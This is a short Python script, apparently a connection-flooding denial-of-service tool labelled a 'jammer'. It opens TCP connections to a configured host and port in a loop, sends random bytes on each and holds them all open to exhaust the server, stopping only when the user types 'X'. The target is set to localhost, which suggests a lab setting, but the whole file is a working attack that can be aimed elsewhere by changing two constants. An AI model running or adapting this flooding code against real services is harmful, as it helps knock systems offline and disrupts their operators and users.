import socket
import threading
import os
import time
import sys

JAM_TARGET = "127.0.0.1"
JAM_PORT = 5555
stop_event = threading.Event()

def jammer():
    """Floods the server with random data and keeps connections open."""
    connections = []
    while not stop_event.is_set():
        try:
            jam_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            jam_socket.connect((JAM_TARGET, JAM_PORT))
            jam_socket.send(os.urandom(1024))  # Send random bytes
            connections.append(jam_socket)  # Keep connections open
            time.sleep(0.1)  # Delay between new connections
        except Exception as e:
            print(f"Jammer Error: {e}")

    # Close all jammed connections on exit
    for conn in connections:
        conn.close()

def listen_for_exit():
    """Stops jamming when 'X' is pressed."""
    while True:
        user_input = input().strip().lower()
        if user_input == "x":
            print("Stopping jamming...")
            stop_event.set()
            sys.exit(0)

if __name__ == "__main__":
    print("Starting signal jamming... Press 'X' to stop.")
    threading.Thread(target=listen_for_exit, daemon=True).start()
    jammer()

